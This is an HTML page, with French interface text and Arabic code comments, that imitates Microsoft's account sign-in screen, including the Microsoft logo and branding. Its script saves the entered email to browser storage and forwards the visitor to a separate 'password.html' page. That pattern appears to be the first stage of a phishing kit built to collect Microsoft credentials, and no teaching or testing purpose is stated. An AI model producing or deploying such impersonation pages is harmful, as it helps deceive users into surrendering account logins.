<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à votre compte Microsoft</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <!-- صندوق تسجيل الدخول الرئيسي -->
        <div class="login-box">
            
            <div class="logo">
                <div class="ms-logo">
                    <span class="red"></span><span class="green"></span>
                    <span class="blue"></span><span class="yellow"></span>
                </div>
                <span class="brand-name">Microsoft</span>
            </div>

            <h2>Se connecter</h2>

            <form id="form-email">
                <div class="input-group">
                    <input type="text" id="username" placeholder="E-mail, téléphone ou identifiant Skype" required autocomplete="off">
                </div>
                <p class="text-link">Vous n'avez pas encore de compte ? <a href="#">Créez-en un !</a></p>
                <p class="text-link"><a href="#">Votre compte n'est pas accessible ?</a></p>
                
                <div class="button-group">
                    <button type="submit" class="btn-primary">Suivant</button>
                </div>
            </form>
        </div>

        <!-- خيارات تسجيل الدخول السفلية -->
        <div class="options-box">
            <button class="btn-options">
                <svg viewBox="0 0 24 24" width="20" height="20">
                    <path d="M7 18a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm11.6-4.6a1 1 0 0 0-1.4 0l-7.5 7.5a6 6 0 1 0 2.8 2.8l1.4-1.4h1.7v1.7a1 1 0 0 0 1 1h1.7v1.7a1 1 0 0 0 1 1h2.2a1 1 0 0 0 1-1v-2.2a1 1 0 0 0-.3-.7l-4.1-4.1v-1.7h1.7a1 1 0 0 0 1-1v-1.7h1.7a1 1 0 0 0 .7-.3l.7-.7a1 1 0 0 0 0-1.4z" fill="#555"/>
                </svg>
                <span>Options de connexion</span>
            </button>
        </div>
    </div>

    <footer>
        <a href="#">Conditions d'utilisation</a>
        <a href="#">Confidentialité et cookies</a>
        <a href="#">...</a>
    </footer>

    <script>
        // عند الضغط على التالي، يتم حفظ البريد في ذاكرة المتصفح والانتقال للصفحة الثانية
        document.getElementById('form-email').addEventListener('submit', function(e) {
            e.preventDefault();
            const emailValue = document.getElementById('username').value;
            localStorage.setItem('user_email', emailValue);
            window.location.href = 'password.html';
        });
    </script>
</body>
</html>
